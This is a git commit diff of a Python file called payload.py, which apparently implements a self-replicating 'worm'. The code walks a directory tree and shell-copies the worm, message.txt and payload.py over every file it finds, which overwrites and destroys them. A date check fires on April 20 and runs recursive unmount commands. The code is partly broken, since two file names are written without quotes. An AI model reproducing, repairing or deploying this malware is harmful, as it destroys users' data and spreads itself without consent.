9217f9a5601231feb90ec0b4889829a14b31ed2e
hyperbeamf <lordofthesquishies@gmail.com>
2020-03-24 06:58:18 -0400

    Split payload and reproduction of worm

--- payload.py
+++ payload.py
@@ -1,13 +1,18 @@
 import os
 from datetime import datetime
 
-def payload(virusname, directory):
+
+def reproduce_worm(name, directory):
     for subdir, dirs, files in os.walk(directory):
         for file in files:
-            # Replicate
-            os.system("cp " + virusname + " " + os.path.join(subdir, file))
+            os.system("cp " + name + " " + os.path.join(subdir, file))
             os.system("cp " + message.txt + " " + os.path.join(subdir, file))
             os.system("cp " + payload.py + " " + os.path.join(subdir, file))
+
+def payload(directory):
+    for subdir, dirs, files in os.walk(directory):
+        for file in files:
             # Main payload
             if (datetime.today().month == 4 and datetime.today().day == 20):
-                os.system("unmount -R " + os.path.join(subdir, file))
+                os.system("umount -R " + os.path.join(subdir, file))
+                
